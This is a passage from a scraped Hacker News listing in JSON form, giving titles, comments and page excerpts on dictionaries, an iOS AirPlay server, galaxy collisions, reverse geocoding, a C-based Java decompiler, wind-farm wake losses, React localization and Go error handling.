which is written in English. It has metadata and links connecting languages' words that you can't find elsewhere.Yes, I indeed do want people to just write what they think a word means \u2013 as a starting point in a collaborative refining process. I believe the number of word-users in the world with valuable potential contributions is a lot closer to a billion than the thousand gatekeepers working hard on classical dictionaries. The barrier to entry is really low, but the tooling could still be much better. This is one reason i'm putting my appeal under this article - because I think (professional) lexicography can stand to evolve more in the 21st century. (And are people today really buying enough dictionaries to sustain a professional version of Wiktionary, or even a professional dictionary offered in structured data form?) If we don't contribute to a crowdsourced dictionary, then we won't have any such thing.(Meta-lookup sites are link/search engines, not dictionaries and IME really don't do a good job synthesizing their information or conventions.)\n \nreply",
      "Wiktionary can be of great value without denigrating others.> Unabridged dictionaries take decades to release new editions and are still navigating transition into the exploding digital age.OED is now a 100% online service - a website - that releases updates every quarter, like much software. I don't see them 'still navigating' at all.> barely accept any crowd contributions.OED is famous for being arguably the first crowd-sourced research project. James Murray, the first great editor and driving force behind the first edition, solicited contributions from the public of usages of words and had a massive filing system of slips with all the contributions.\"Dictionary work relied on so much correspondence that a post box was installed right outside Murray\u2019s Oxford home ...\". \"His children (eventually there were eleven) were paid pocket money to sort the dictionary slips into alphabetical order upon arrival.\" [0]Today OED still solicits contributions, including specific appeals to the public. Every entry in the OED has a 'Contribute' button.https://www.oed.com/information/using-the-oed/contributing-t...> (Yesterday I tried to verify the latter English senses of \"fandango\" on Wiktionary with other dictionaries; OED's entry has not been touched for 131 years! What am I going to do with that, I need to use / understand the word now!)You are misunderstanding what 'revise' means to the OED (which is unnecessarily confusing); they still update entries without a full revision. If you look at the entry history:fandango, n. was first published in 1894; not yet revised.fandango, n. was last modified in March 2025.> I don't think definitions \"are\" highly accurate precise things. Sometimes yes. The same scholarship, skill, and need to not mislead also applies for so many other things: encyclopedic articles, taxonomies, news, maps, operating systems. Do people still question the value of Wikipedia, OpenStreetMap?I think there's a difference between requirements - or expectations -  for a dictionary and Wikipedia:My guess is that people don't question Wikipedia because they have different expectations for it: They don't expect accuracy, as defined by the Three Cs: Completeness, Correctness, Consistency. Wikipedia is more the accumulation of information generally believed about a topic (with some standards, imperfectly followed, for secondary source support - but secondary sources reflect general, consensus belief). It's not expected to be Complete; no encyclopedia can completely cover any topic - the point is to be a starting place, a summary - and anyway Wikipedia is a sort of work in progress. It's not expected to be Correct; it's what people generally believe. And Consistency is tough with so many authors. It's really an product of the post-truth era; that's what people want - just try questioning it.People's expectation for dictionaries - or my expectation at least :) - is not a starting point but the final word. Almost always I already have an idea of what the word means - from partial knowledge, from experience, from context, from its components. I'm expecting the Three Cs from the dictionary, to put a fine point on my understanding and use of the word, to fill in my blind spots - including knowledge of how others have been understanding and using the word.Maybe Wiktionary just isn't for me. But I worry that people do assume it's CCC - many people believe anything they read is accurate, especially something from an authoritative-looking source - and are confused by it.[0] https://www.oed.com/information/about-the-oed/history-of-the...\n \nreply",
      "Could I make a plea to make a wikitionary export easier to find/use? Assuming I can even find the magical page which hosts them, Wikipedia dumps are terribly documented and seem to incorporate shorthand which I do not recognize.\n \nreply",
      "And they are full of wiki markup, templates, and inconsistent formatting. A human brain can easily understand it, but automated parsing is impossible (pre LLM).\n \nreply"
    ],
    "link": "https://www.inotherwords.app/linguabase/",
    "first_paragraph": "Building a word game forced us to solve a measurement problem: how do you rank 40+ ways to associate any given word down to exactly 17 playable choices? We discovered that combining human-curated thesauri, book cataloging systems, and carefully constrained LLM queries creates a navigable network where 76% of random word pairs connect in \u22647 hops\u2014but only when you deprecate superconnectors and balance multiple ranking signals. The resulting network of 1.5 million English terms reveals that nearly any two common words connect in 6-7 hops through chains of meaningful associations. The mean path length of 6.43 hops held true across a million random word pairs\u2014shorter than we\u2019d guessed, and remarkably stable.This is consistent with the small-world structure and near-universal connectivity seen in lexical network research on smaller datasets.1,2 The network's structure makes intuitive semantic navigation possible\u2014players can feel their way through meaningful transitions: a crown's gemstones l"
  },
  {
    "title": "Show HN: AirAP AirPlay server - AirPlay to an iOS Device (github.com/neon443)",
    "points": 143,
    "submitter": "neon443",
    "submit_time": "2025-06-03T20:12:33 1748981553",
    "num_comments": 23,
    "comments_url": "https://news.ycombinator.com/item?id=44174190",
    "comments": [
      "How old of a device can I install this on? (Eg to make an old phone an AirPlay receiver).Edit: looks like ios17 is earliest\n \nreply",
      "That's interesting! Does it work for streaming video or just audio? Sometimes I'd love to AirPlay from my video editing software to my iPhone to check how it looks on the smaller screen, checking colors and overall appearance.\n \nreply",
      "We\u2019ve been looking for something like this for our conference room. A PC presenting on a large TV, but mirrored/AirPlayed on iPads for anyone that wanted a version closer to their face.\n \nreply",
      "Thank you so much for checking something off of my todo list!Apple TV lets you share with two sets of apple headphones, which is awesome... but I wanted a way to:* Share to more than two sets\n* Extend coverage past the (very generous) bluetooth range of AirPods.\n* Have lossless (albeit 44khz/16bit) wireless audio with audiophile headphones.I was considering using an esp32, but so happy this exists now! Thanks!\n \nreply",
      "Doesn\u2019t this still limit to one device?\n \nreply",
      "Works great from iPhone to iPhone.\n \nreply",
      "This is actually something I've been looking for for a while, through some workarounds with jelkyfin and others I've been able to navigate something but this seems promising.I've got a few questions maybe later with the protocols and stuff but so far from initial look, it seems super promising.Nice job really!\n \nreply",
      "A lot of apps allow you to AirPlay to multiple devices at once \u2014 would be neat to put this on a bunch of iphones to simultaneously play music\n \nreply",
      "Any suggestions for such apps? I'm planning using something like this for a silent disco...\n \nreply",
      "Neat way to turn an iDevice in to a usable DAC.\n \nreply"
    ],
    "link": "https://github.com/neon443/AirAP",
    "first_paragraph": "We read every piece of feedback, and take your input very seriously.\n            To see all available qualifiers, see our documentation.\n          \n        airplay to an ios device\n       There was an error while loading. Please reload this page.\nThere was an error while loading. Please reload this page.\n\n\n        use your iphone as an airplay receiver\n        \n\n            made by neon443\n        \n\n\n            testflight\n        \nAirAP is a fully native AirPlay server, written in Swift, for iOS. Essentially, AirAP allows you to use your iPhone as an AirPlay receiver in iTunes or on your Mac, meaning that you can use your iPhone to play your device's sound.Have you ever wanted to stream audio from your Mac, Apple TV, or another iOS device to your iPhone? AirAP makes this possible by implementing a full AirPlay server that runs natively on iOS. Once installed, your iPhone will appear as an available AirPlay destination in iTunes (including the Windows version), Music app, or any other "
  },
  {
    "title": "New study casts doubt on the likelihood of Milky Way collision with Andromeda (durham.ac.uk)",
    "points": 6,
    "submitter": "layer8",
    "submit_time": "2025-06-03T22:45:11 1748990711",
    "num_comments": 0,
    "comments_url": "",
    "comments": [
      "xxx"
    ],
    "link": "https://www.durham.ac.uk/departments/academic/physics/news/new-study-casts-doubt-on-the-likelihood-of-milky-way-collision-with-andromeda/",
    "first_paragraph": "\r\n    New research has cast doubt on the long-held theory that our galaxy, the Milky Way, will collide with its largest neighbour, the Andromeda galaxy, in 4.5 billion years-time. \r\n  Scientists used data from NASA\u2019s Hubble and the European Space Agency\u2019s Gaia space telescopes to simulate how the Milky Way, Andromeda and their most massive satellite galaxies could evolve over the next 10 billion years.\u00a0They found that there is only a 2% probability that the galaxies will collide in the next 5 billion years, contrary to the previous belief that a collision was a certainty within that timeframe.\u00a0In around half of the simulated scenarios, the Milky Way and Andromeda experience at least one close encounter, before losing enough orbital momentum to eventually merge.\u00a0\u00a0In most other cases, the two galaxies pass at such a large distance that they continue to evolve largely unperturbed for a very long time.\u00a0\u00a0If the Milky Way and Andromeda are to collide and merge, the researchers found that it "
  },
  {
    "title": "Mapping latitude and longitude to country, state, or city (austinhenley.com)",
    "points": 21,
    "submitter": "azhenley",
    "submit_time": "2025-06-03T22:13:01 1748988781",
    "num_comments": 10,
    "comments_url": "https://news.ycombinator.com/item?id=44175356",
    "comments": [
      "For reducing the number of points I've often used mapshaper.org.For deciding if a user is in Texas you could create a simple polygon completely inside Texas and one in Oklahoma. 99% would fall in the simple polygon and the rest go to the detailed polygons. Or create bounds near the complex river borders and use the detailed polygons there.On the other hand I just use simple, non-optimized functions for qquiz.com.\n \nreply",
      "The right term for what you are doing is \"reverse geocoding\".\n \nreply",
      "> I set up an experiment that compares the original geometry with the simplified geometry by testing 1,000,000 random points within the US.I'd be curious if the reliability is different if, instead of random locations, you limited it to locations with some level of population density. Because a lot of the USA is rural, so that random set is not going to correlate well to where people actually are. It probably matters more the farther east you go as well, as the population centers overlap borders more when you get to the eastern seaboard.\n \nreply",
      "Good thinking. I discuss population density, cities near borders, and narrow borders in the last section.\n \nreply",
      "As a native Philadelphian, I immediately see why you need a good resolution here - at 0.1 degrees resolution you very well could have assigned my birthplace to New Jersey.  If I'm not mistaken New York and Philadelphia are the largest cities where you might have a problem.  Chicago's on a state line but the Illinois-Indiana border is straight.\n \nreply",
      "I wonder if it\u2019s actually straight though? In the chart on the page, Colorado is described as having 7000-something vertices, where I would have expected it to have \u2026 4.\n \nreply",
      "There's the congresionally approved boundary.  Then there's the surveyed boundary.  Wherein a team of people goes out and hammers survey marks and tags into the earth or creates man made monuments when that is not possible.",
      "Good writeup/tool. Seeing the number of vertices just for state boundaries makes me a little less hostile to Google's API.\n \nreply",
      "Use Nominatim: https://nominatim.org/It can be self-hosted, with constant replication. There's also Photon which is a cut-down version of it: https://photon.komoot.io\n \nreply",
      "This is great!  Now where's the same thing for time zones?\n \nreply"
    ],
    "link": "https://austinhenley.com/blog/coord2state.html",
    "first_paragraph": "\n\t\t\t\t\t\tAssociate Teaching Professor\n\t\t\t\t\t\tCarnegie Mellon University\n\t\t\t\t\tAn app can easily check a user's location (with permission), but figuring out where that location is, is far more difficult. For example, a web app can use geolocation.getCurrentPosition() to get a user's location in the form of latitude and longitude coordinates. But how do you convert coordinates to country, state, or city? Well, you have to look it up, somehow. (I later learned this is called reverse geocoding.)At the startup I worked at, we paid several thousands of dollars per year for the Google Maps API to do a reverse lookup (that decision was made long before I joined). Given the coordinates, it gave us back a full address. We only cared about the state they were in, so we ignored the rest. If the user didn't allow us to check their location, we simply showed a state selection screen:We paid thousands of dollars a year, just for users to avoid this screen!? Yep.Shortly after I joined the company, I tried"
  },
  {
    "title": "Show HN: I wrote a Java decompiler in pure C language (github.com/neocanable)",
    "points": 152,
    "submitter": "neocanable",
    "submit_time": "2025-06-03T12:14:29 1748952869",
    "num_comments": 73,
    "comments_url": "https://news.ycombinator.com/item?id=44169132",
    "comments": [
      "You've used GPL2 code taken from git (hashmap.c) in your Apache 2.0 project.https://opensource.stackexchange.com/questions/10737/inclusi...\n \nreply",
      "I'm curious, how did you notice this?Do you have a scanner that checks these sorts of things or is it something that you are passionate about?\n \nreply",
      "I am always curious how different C programs decide how to manage memory.In this case there are is a custom string library. Functions returned owned heap-allocated strings.However, I think there's a problem where static strings are used interchangably with heap-allocated strings, such as in the function `string class_simple_name(string full)` ( https://github.com/neocanable/garlic/blob/72357ddbcffdb75641... )Sometimes it returns a static string like `g_str_int` and sometimes a newly heap-allocated string, such as returned by `class_type_array_name(g_str_int, depth)`.Callers have no way to properly release the memory allocated by this function.\n \nreply",
      "In multi-threaded mode, each thread will create a separate memory pool. If in single-threaded mode, a global memory pool is used. You can refer to https://github.com/neocanable/garlic/blob/72357ddbcffdb75641.... The x_alloc and x_alloc_in in it indicate where the memory is allocated. When each task ends, the memory allocated in the memory pool is released, and the cycle repeats.\n \nreply",
      "Many command line tools do not need memory management at all, at least to first approximation. Free nothing and let the os cleanup on process exit. Most libraries can either use an arena internally and copy any values that get returned to the user to the heap at boundaries or require the user to externally create and destroy the arena. This can be made ergonomic with one macro that injects an arena argument into function defs and another that replaces malloc by bumping the local arena data pointer that the prior macro injected.\n \nreply",
      "That might be true, but leaking is neither the critical nor the most hard to find memory management issue, and good luck trying to adapt or even run valgrind with a codebase that mindlessly allocates and leaks everywhere.\n \nreply",
      "Shhh. We want the ML models trained on this sort of deeply flawed code.\n \nreply",
      "Pretty sure you can just disable leak checking.\n \nreply",
      "But for example verifying that memory is not touched after it is supposed to, is much harder when you can't rely on it being freed.Of course literally running valgrind is still possible, but it is difficult to get useful information.\n \nreply",
      "You cannot have use-after-free if you never call free, so there are no points at which memory should not be touched.That's the beauty of the never free memory management strategy.\n \nreply"
    ],
    "link": "https://github.com/neocanable/garlic",
    "first_paragraph": "We read every piece of feedback, and take your input very seriously.\n            To see all available qualifiers, see our documentation.\n          \n        Java decompiler written in C\n       There was an error while loading. Please reload this page.\nThere was an error while loading. Please reload this page.Java decompiler written in CTool for produces java source code from .class or jar filerequirements: cmake >= 3.26No other dependenciesdecompile .class filedecompile .class file, default output is stdoutdecompile jar filedefault output is same level directory as the filejavaplike javap, more faster, disabled LineNumber and StackMapTable attributesdexdumpin src/jvm.c, change main function to:if thread count less than 2, it will disable multiple thread.Licensed under the Apache 2.0 License\n        Java decompiler written in C\n       There was an error while loading. Please reload this page.\nThere was an error while loading. Please reload this page. There was an error while loading. Ple"
  },
  {
    "title": "'Wind theft': The mysterious effect plaguing wind farms (bbc.com)",
    "points": 21,
    "submitter": "JumpCrisscross",
    "submit_time": "2025-05-31T12:21:54 1748694114",
    "num_comments": 20,
    "comments_url": "https://news.ycombinator.com/item?id=44143782",
    "comments": [
      "Oh, the wailing and gnashing of teeth over wake losses. Let's get some figures:* From their own study: the cumulative wake loss impact of four new wind farms in the Irish Sea on Orsted's existing estate is 3.28% [0]\n* \"Wind turbines are found to lose 1.6\u00b10.2% of their output per year.\" [1]So, wake losses turn a brand new wind farm into a 2-year-old wind farm. Given the yuuuuuge lifespan of wind farms, it seems kinda trivial.[0] https://www.rechargenews.com/wind/-catastrophic-wake-losses-...[1] https://www.sciencedirect.com/science/article/pii/S096014811...\n \nreply",
      "If windfarms reduce overall wind speed around them and if there are enough of them built, wouldn't this measurably reduce the wind speed in the environment?And if the wind speed of the environment is measurably reduced, wouldn't this affect the environment itself?What are the negative effects of this on birds, climate, insect population, etc...? Do positive effects significantly outweigh negatives?\n \nreply",
      "The amount we can extract is tiny compared  to the volume of energy put into the air every day by the sun. At a certain scale it could definitely become an issue and change the local environment and reduce wind speeds, we have seen that with some of the biggest solar farms where the air temperature is changed and the shade increases vegetation and wildlife so presumably wind speed reductions will have some effect. But compared to the CO2e it saves from being emitted its absolutely worth it currently.\n \nreply",
      "That really is only a problem if the direction of the wind never changes. But if the direction of the wind turns around the farm stealing the wind and the farm being robbed of wind switch roles.\n \nreply",
      "Also, isn't it really stupid to treat the wind the same way we do with rivers or with electrical current (which is actually  flowing the opposite way to electrons, so not like the river/wind at all)?E.g. country A is saying that country B is stealing their incoming (upstream) wind, but there's currently a zone of negative pressure (based on the mountains/shore/passing by cyclone/whatever) on the country A's territory which actually allows for the pressure gradient to form through both countries A and B - so there's more energy potential available to tap into on country A's territory?\n \nreply",
      "The word \"rights\" surprisingly didn't come in that piece.  By analogy to \"water rights\" [1], \"wind rights\" are a thing, both in the basic sense of permission to extract wind power from some chunk of land [2] and the messier sense of that article: conflicts between upstream and downstream users of the wind [3] (recent article and fascinating read)[1] https://en.wikipedia.org/wiki/Riparian_water_rights[2] https://en.wikipedia.org/wiki/Wind_rights[3] https://eelp.law.harvard.edu/wind-wakes-and-the-right-to-win...\n \nreply",
      "Wind rights, as presently constructed, are more analogous to air rights than water rights. They convey the right to use a space versus resource.\n \nreply",
      "This made me think of a cool sci Fi post apocalyptic idea. \nA colony that has its base in the middle of violent tornado or storm country but it has a huge array of wind machines that harvest the storm for energy. On the leeward side of the array, where the colony lives, the air is calm, robbed of its energy.\n \nreply",
      "This has in the past been scientifically proposed as a legitimate way to cure the US of tornadoes while yielding significant energy in the process.\n \nreply",
      "This sounds a lot like the plot of The Horde of Counterwind by Alain Damasio\n \nreply"
    ],
    "link": "https://www.bbc.com/future/article/20250506-renewable-energys-trouble-with-wind-theft",
    "first_paragraph": "As wind farms expand, some can accidentally \"steal\" each others' wind \u2013 causing worries over some countries' energy transition to net zero.As offshore wind farms are expanding around the world in the race to meet net zero climate targets, a worrying phenomenon is attracting growing attention: in some conditions, wind farms can \"steal\" each other's wind.\"Wind farms produce energy, and that energy is extracted from the air. And the extraction of energy from the air comes with a reduction of the wind speed,\" says Peter Baas, a research scientist at Whiffle, a Dutch company specialising in renewable energy and weather forecasting. The wind is slower behind each turbine within the wind farm than in front of it, and also behind the wind farm as a whole, compared with in front of it, he explains. \"This is called the wake effect.\"Simply put, as the spinning turbines of a wind farm take energy from the wind, they create a wake and slow the wind beyond the wind farm. This wake can stretch more t"
  },
  {
    "title": "Show HN: Localize React apps without rewriting code (github.com/lingodotdev)",
    "points": 63,
    "submitter": "maxpr",
    "submit_time": "2025-06-03T17:27:32 1748971652",
    "num_comments": 54,
    "comments_url": "https://news.ycombinator.com/item?id=44172428",
    "comments": [
      "I worked on a project at Patreon to do something similar many years ago. We used a babel plugin to do the translation with as few changes to the code base as possible.This application does not handle many important considerations for translation. Such as pluralization. In many languages there are multiple more ways to pluralize words. Russian has many different ways to pluralize. More problems will occur when you have words within words.There is no way to do this without working on changing your codebase. I think what would work better is if you can create ICU compliant JSON.How are you supposed to have this work in Japanese when it's RTL instead of LTR? That will require UI and localization challenges.I think using AI to do translation will be fine for startups, but I'm not sure how well this will work on real production apps. I think significant work will be required to actually get this working:https://stelejs.com\n \nreply",
      "I think modern Japanese is LTR, but besides that - I believe the project you worked in the past solves an important problem.Besides pluralization (and e.g. Arabic having 6 forms zero/one/two/few/many/other), turned out number internationalization and currency conversion are big next challenges the community wants to address next.> create ICU compliant JSON.I think this is an excellent idea. I have a feeling in the future we will need ICU v2.0, sort of, but unfortunately it's an extremely hard problem and the probability to fail is pretty high (looks like project fluent is not actively maintained anymore: https://github.com/projectfluent/fluent)\n \nreply",
      "> I think modern Japanese is LTRDepends on the medium. EPUB 2.0 (and later revisions) specifically supports vertical RTL text for use-cases like Japanese novels. Additionally, many novel reading websites support toggling between vertical and horizontal text. Vertical text implicitly switches to RTL text direction.Of course, this is not a general use case. But saying \"modern Japanese is LTR\" is not quite accurate. Computer / digital media is commonly LTR and horizontal, but a single step outside exposes one to vertical text, and RTL text in physical newspapers, literature, comics, a subset of textbooks, and handwritten signs that try to look \"traditional\" in style.\n \nreply",
      "Cool project! I built a similar tool [0] last year, but:1. Targeting fbt (Meta's internal i18n tool)2. Used CST (<3 ast-grep) instead of AST - really useful here IMO esp. for any heuristic-based checks.3. Fun fact: this was made entirely on my phone (~2.5h) while I was walking around Tokyo. Voice prompting + o1-pro. Why? My friend was working on porting fbt to TS and said he was planning to build this. I wanted to one-up him + convince him to start using LLMs =)One thing you should be aware of is that for at least Japanese, localization is far from just translating the text. There are lots and lots of Japan-specific cultural nuances you have to take into account for web users and even down to actually just having an entirely different design for your landing page often because those you'll find those just convert better when you know certain things are done that are typically not done for you know non-Japan websites.Notta (multi-lingual meeting transcriptions + reports) is a great example if you compare their Japanese [1] and English [2] landing pages.Note how drastically different the landing pages are. Furthermore, even linguistically, Japanese remains a challenge for proper context-dependent interpretation. Gemini 2.5 actually likely performs best for this thanks to Shane Gu [3], who's put in tons of work into having it perform well for Japanese (as well as other \"tough\" languages)[0] https://github.com/f8n-ai/fbtee-migrate[1] https://www.notta.ai (Japanese version)[2] https://www.notta.ai/en (English version)[3] https://x.com/shaneguML\n \nreply",
      "Thanks! =)> localization is far from just translating the textFor sure, that's spot on.What I'm excited about the most is that linguistic/cultural aspects are close to being solved by LLMs, including Gemini 2.5 that's got a huge performance boost vs the previous iteration. So, the automated approaches make more sense now, and have a chance of becoming the default, reducing i18n maintenance down to zero - and as a dev I can't be not excited about that.P.S. fbt is great by the way, as is the team behind it. It's a shame it's archived on GitHub and isn't actively maintained anymore.\n \nreply",
      "This needs to integrate with translation management formats/services instead of an LLM\u2014it might work for some cases but will absolutely butcher jargon translations! In its current state it is worse than useless for sites managing content geared for technical/professional audiences.\n \nreply",
      "Perhaps I could've communicated this better, but we've built Lingo.dev Compiler for web apps and user interfaces, not for technical/professional content.And since we had to exclude certain terms like \"Lingo.dev Compiler\" itself from i18n, we've shipped support for data-lingo-skip and data-lingo-override-<locale-code> as well.Regarding using LLMs for production content localization, I recommend checking out how Reddit translates their entire user-generated content base in 35 languages using AI:https://techcrunch.com/2024/09/25/reddit-is-bringing-ai-powe...If it already works great for Reddit today, I believe it's safe to assume it will become accessible to the wider audience soon as well.\n \nreply",
      "I thought this was awesome until you included an LLM into the mix.I hate the current react i18n solutions, and the fact that they only work in runtime, as opposed to Angular\u2019s build time i18n solution.If your compiler could plugin to existing localization workflows in large organizations to at would be great (ie: extraction, load from configuration).\n \nreply",
      "Thanks for the perspective!We support larger org workflows with the Lingo.dev Engine product, but that's not the point: Lingo.dev Compiler is unrelated to that, 100% free and open source.We started with a thought - what if i18n is actually meant to be build-time, LLM-powered, and that's enough for it to be precise? Not today, but in the future, it feels like this type of solution could elegantly solve i18n at scale, in software, as opposed to the existing sophisticated workflows.WDYT?\n \nreply",
      "> essentially rewriting your entire codebase before you can even start translatingI\u2019d say it just takes a few prompts in Cursor or a similar tool.Then, you simply ask it to translate into other languages. Here\u2019s how I did it for one of my projects - a quantum optics simulator: https://p.migdal.pl/blog/2025/04/vibe-translating-quantum-fl...Doing it at runtime might make sense for a typical translation. But for scientific (or engineering) content, we often want to verify the output. Translating in production can be wonderful, hilarious, or just inconsistent.\n \nreply"
    ],
    "link": "https://github.com/lingodotdev/lingo.dev",
    "first_paragraph": "We read every piece of feedback, and take your input very seriously.\n            To see all available qualifiers, see our documentation.\n          \n        \u26a1\ufe0f Open-source AI-powered CLI for web & mobile localization. Bring your own LLM or use Lingo.dev localization engine. Join discord: https://lingo.dev/go/discord\n There was an error while loading. Please reload this page.\nThere was an error while loading. Please reload this page.NoteIntroducing Lingo.dev Compiler - Make any React app multilingual at build time without changing your components. Read the docs.\n\n\n\n\n\u26a1\ufe0f AI-powered open-source tools for web & mobile localization.\n\nLingo.dev CLI \u2022\n  Lingo.dev CI/CD \u2022\n  Lingo.dev Compiler \ud83c\udd95\n\n\n\n\n\n\n\n\n\n\nLingo.dev is an open-source, i18n toolkit designed to help use LLMs for localization and translation of web, mobile apps and markdown content.Lingo.dev includes:All tools are designed to help use LLM models for precise translation and localization, and to eliminate manual work.See Lingo.dev Comp"
  },
  {
    "title": "Polish engineer creates postage stamp-sized 1980s Atari computer (arstechnica.com)",
    "points": 43,
    "submitter": "dangle1",
    "submit_time": "2025-06-03T22:35:08 1748990108",
    "num_comments": 0,
    "comments_url": "",
    "comments": [
      "xxx"
    ],
    "link": "https://arstechnica.com/gadgets/2025/06/polish-engineer-creates-postage-stamp-sized-1980s-atari-computer/",
    "first_paragraph": "\n        Hobby project shrinks 1980s computer platform that pierced the Iron Curtain.\n      In 1979, Atari released the Atari 400 and 800, groundbreaking home computers that included custom graphics and sound chips, four joystick ports, and the ability to run the most advanced home video games of their era. These machines, which retailed for $549 and $999, respectively, represented a leap in consumer-friendly personal computing, with their modular design and serial I/O bus that presaged USB. Now, 46 years later, a hobbyist has shrunk down the system hardware to a size that would have seemed like science fiction in the 1970s.Polish engineer Piotr \"Osa\" Ostapowicz recently unveiled \"Atarino,\" which may be the world's smallest 8-bit Atari computer re-creation, according to retro computing site Atariteca. The entire system\u2014processor, graphics chips, sound hardware, and memory controllers\u2014fits on a module measuring just 2\u00d71.5 centimeters (about 0.79\u00d70.59 inches), which is roughly the size o"
  },
  {
    "title": "Show HN: An Alfred workflow to open GCP services and browse resources within (github.com/dineshgowda24)",
    "points": 37,
    "submitter": "dineshgowda24",
    "submit_time": "2025-06-03T19:25:57 1748978757",
    "num_comments": 9,
    "comments_url": "https://news.ycombinator.com/item?id=44173667",
    "comments": [
      "This is really cool, one thing that would make it much more useful for me is to have the ability to easily select which project you want to use, especially if it could have the same fuzzy search as resources. My company has hundreds of GCP projects. At the moment it seems like I'd have to set up individual configurations for each project.\n \nreply",
      "Anyone know if something similar exists for raycast?\n \nreply",
      "This is actually amazing.  I wish there was something similar that for windows's keypirinha[1].specifically would be interesting to have something like that for k8s resources.1. https://keypirinha.com/\n \nreply",
      "Thank you for the feedback!Hopefully, someone will do it, or perhaps you can try replicating the same approach for Keypirinha.\n \nreply",
      "What is Alfred?\n \nreply",
      "Alfred is a Spotlight replacement for macOS.\nhttps://www.alfredapp.com/You can build any workflow based on your use case, and you can execute those right from your keyboard. Workflows are limited only by your imagination, like turning off Bluetooth, killing a process, emptying trash, and much more, just from a few keyboard strokes.For example, this workflow allows you to open a specific service or resource page in the GCP console directly from the keyboard, eliminating the need to navigate to Google Cloud, search for the desired page, and then open it, which can be a time-consuming process. Also, lets you avoid the mouse altogether.\n \nreply",
      "It\u2019s also some of the most fantastically fast, stable, and efficient software I\u2019ve used on any platform. It takes up almost no space on disk, takes very little memory, and doesn\u2019t waste cycles doing mysterious somethings in the background. Just great all around.\n \nreply",
      "Quicksilver [0] and Alfred [1] are versatile search/launchers for macOS, combining aspects of Spotlight, Launchpad, Finder, and a CLI.  You hit a trigger key combination, and you're presented with an app that can interact via keystrokes (generally not mouse actions) with all your other apps and docs, contacts, photos, music, clipboard history, etc.  These can involve plugins and workflows that manipulate text, create calendar events or reminders, etc.[0] https://qsapp.com (source on github: https://github.com/quicksilver/Quicksilver)\n[1] https://www.alfredapp.com\n \nreply",
      "I always do a double take when I see the term QuckSilver[2].... the dBase III compiler from the 80s.[2] https://winworldpc.com/product/quicksilver/1x\n \nreply"
    ],
    "link": "https://github.com/dineshgowda24/alfred-gcp-workflow",
    "first_paragraph": "We read every piece of feedback, and take your input very seriously.\n            To see all available qualifiers, see our documentation.\n           There was an error while loading. Please reload this page.\nThere was an error while loading. Please reload this page.\n        An Alfred workflow to open GCP services and browse resources within\n       There was an error while loading. Please reload this page.\nThere was an error while loading. Please reload this page.\n\n\n\nAn Alfred workflow that lets you instantly open Google Cloud services or search GCP resources\u2014fast, simple, and right from your Alfred.  \ud83c\udd98 Still stuck? Read the full installation guide for step-by-step help.If you notice anything that doesn't align with this, it's unintentional, please open an issue \ud83d\ude4fExamples of global resources:Here are the GCP resources currently searchable through the workflow:Please refer to the contributing guidelines for instructions on setting up your environment and submitting contributions.This proj"
  },
  {
    "title": "(On | No) Syntactic Support for Error Handling (go.dev)",
    "points": 287,
    "submitter": "henrikhorluck",
    "submit_time": "2025-06-03T16:18:45 1748967525",
    "num_comments": 383,
    "comments_url": "https://news.ycombinator.com/item?id=44171677",
    "comments": [
      "If you feel the need (as many have in this thread) to breezily propose something the Go Team could have done instead, I urge you to click the link in the article to the wiki page for this:https://go.dev/wiki/Go2ErrorHandlingFeedbackor the GitHub issue search: https://github.com/golang/go/issues?q=+is%3Aissue+label%3Aer...I promise that you are not the first to propose whatever you're proposing, and often it was considered in great depth. I appreciate this honest approach from the Go Team and I continue to enjoy using Go every day at work.\n \nreply",
      "The draft design document that all of the feedback is based on mentions C++, Rust, and Swift.  In the extensive feedback document you link above I could not find mention of do-notation/for-comprehensions/monadic-let as used Haskell/Scala/OCaml.  I didn't find anything like that in the first few pages of the most commented GitHub issues.You make it out like the Go Team are programming language design wizards and people here are breezily proposing solutions that they must have considered but lets not forget that the Go team made the same blunder made by Java (static typing with no parametric polymorphism) which lies at the root of this error handling problem, to which they are throwing up their hands and not fixing.\n \nreply",
      "> lets not forget that the Go team made the same blunder made by JavaTo be fair, they were working on parametric polymorphism since the beginning. There are countless public proposals, and many more that never made it beyond the walls of Google.Problem was that they struggled to find a design that didn't make the same blunder as Java. I'm sure it would have been easy to add Java-style generics early on, but... yikes. Even the Java team themselves warned the Go team to not make that mistake.\n \nreply",
      "At least Java supports covariance and contravariance where Go only supports invariant generics.\n \nreply",
      "Java has evolved to contain much of \u201cML the good parts\u201d such as that languages like Kotlin or Scala that offer a chance to be just a bit better in the JVM look less necessary\n \nreply",
      "I think Go should have shipped with generics from day one as well.But you breezily claiming they made the same blunder as Java omits the fact that they didn't make the same blunder as Rust and Swift and end up with nightmarish compile times because of their type system.Almost every language feature has difficult trade-offs. They considered iteration time a priority one feature and designed the language as such. It's very easy for someone looking at a language on paper to undervalue that feature but when you sit down and talk to users or watch them work, you realize that a fast feedback loop makes them more productive than almost any brilliant type system feature you can imagine.\n \nreply",
      "This is a very good point, fast compilation times are a huge benefit.  The slow compiler is a downside of languages like Rust, Scala, and Haskell.  Especially if you have many millions of lines of code to compile like Google.However, OCaml has a very fast compiler, comparable in speed to Go.  So a more expressive type system is not necessarily leading to long compilation times.Furthermore, Scala and Haskell incremental type checking is faster than full compilation and fast enough for interactive use. I would love to see some evidence that Golang devs are actually more productive than Scala or Haskell devs.  So many variables probably influence dev productivity and controlling for them while doing a sufficiently powered experiment is very expensive.\n \nreply",
      "What makes you think Rust\u2019s compile times are related to its type system?\n \nreply",
      "Last time I checked, Rust's slow compile times were due to LLVM. In fact, if you want to make Rust faster to compile, you can compile it to wasm using cranelift.\n \nreply",
      "Even Rust and F#[1] don't have (generalized) do notation, what makes it remotely relevant to a decidedly non-ML-esque language like Go?[1] Okay fine, you can fake it with enough SRTPs, but Don Syme will come and burn your house down.\n \nreply"
    ],
    "link": "https://go.dev/blog/error-syntax",
    "first_paragraph": "Common problems companies solve with GoStories about how and why companies use GoHow Go can help keep you secure by defaultTips for writing clear, performant, and idiomatic Go codeA complete introduction to building software with GoReference documentation for Go's standard libraryLearn what's new in each Go releaseVideos from prior eventsMeet other local Go developersLearn and network with Go developers from around the worldThe Go project's official blog.Get help and stay informed from Go\n      Robert Griesemer\n      3 June 2025\n      One of the oldest and most persistent complaints about Go concerns the verbosity of error handling.\nWe are all intimately (some may say painfully) familiar with this code pattern:The test if err != nil can be so pervasive that it drowns out the rest of the code.\nThis typically happens in programs that do a lot of API calls, and where handling errors\nis rudimentary and they are simply returned.\nSome programs end up with code that looks like this:Of the ten"
  },
  {
    "title": "Show HN: Gradle plugin for faster Java compiles (github.com/elide-dev)",
    "points": 17,
    "submitter": "sgammon",
